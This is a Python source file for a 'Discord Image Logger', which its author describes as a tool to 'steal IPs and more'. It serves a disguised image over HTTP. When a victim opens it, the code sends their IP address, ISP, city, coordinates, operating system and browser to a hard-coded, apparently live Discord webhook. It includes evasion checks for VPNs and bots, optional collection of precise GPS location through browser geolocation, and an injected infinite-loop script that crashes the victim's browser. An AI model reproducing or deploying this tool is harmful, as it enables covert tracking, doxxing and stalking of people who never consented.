# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1115235557866475551/S4VV9-Jk26wWUJNjJ50gIUifY-2PefDZ0yToFxsBNgp2-pXvii_83rDPycznY2cV6Gmm",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
